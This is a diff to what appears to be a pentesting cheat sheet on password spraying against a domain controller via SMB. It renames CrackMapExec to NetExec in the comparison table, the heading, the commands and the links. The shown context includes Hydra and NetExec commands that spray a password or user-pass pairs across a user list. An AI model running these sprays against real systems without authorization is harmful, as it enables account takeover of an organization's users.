@@ -5,7 +5,7 @@
 | Metasploit | yes | yes | yes | yes |
 | Kerbrute | yes | yes | yes | no |
 | Hydra | yes | yes | no | no |
-| CrackMapExec | yes | yes | yes | yes |
+| NetExec | yes | yes | yes | yes |
 
 ## Method 1: Metasploit
 
@@ -48,14 +48,14 @@ hydra -t 4 -L 'USER_FILE' -p 'PASSWORD' 'smb://DC_IP'
 
 **Note:** Hydra will not report accounts with an expired password.
 
-## Method 4: CrackMapExec
+## Method 4: NetExec
 
 ```bash
 
 # USER=PASS - --no-bruteforce pairs the nth user with the nth password
-cme smb DC_IP -u 'USER_FILE' -p 'USER_FILE' --no-bruteforce --continue-on-success
+nxc smb DC_IP -u 'USER_FILE' -p 'USER_FILE' --no-bruteforce --continue-on-success
 # Spray one password - --continue-on-success finds all valid accounts, not just the first
-cme smb DC_IP -u 'USER_FILE' -p 'PASSWORD' --continue-on-success
+nxc smb DC_IP -u 'USER_FILE' -p 'PASSWORD' --continue-on-success
 
 ```
 
@@ -67,4 +67,4 @@ cme smb DC_IP -u 'USER_FILE' -p 'PASSWORD' --continue-on-success
 
 - Metasploit - https://github.com/rapid7/metasploit-framework
 - kerbrute - https://github.com/ropnop/kerbrute
-- CrackMapExec - https://github.com/byt3bl33d3r/CrackMapExec
+- NetExec - https://github.com/Pennyw0rth/NetExec
